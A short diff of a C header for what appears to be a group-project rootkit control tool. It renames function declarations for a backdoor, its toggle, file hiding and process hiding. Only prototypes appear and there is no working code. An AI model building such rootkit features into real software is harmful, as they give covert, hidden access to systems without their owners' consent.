@@ -22,8 +22,8 @@ void help();
 
 int handle_ping(void *);
 int handle_filehide(void *);
-int handle_backdoor_execve(void *);
-int handle_backdoor_toggle(void *);
+int handle_backdoor(void *);
+int handle_togglebd(void *);
 int handle_hidepid(void *);
 
 #endif//_GROUP7_RKCTL_H
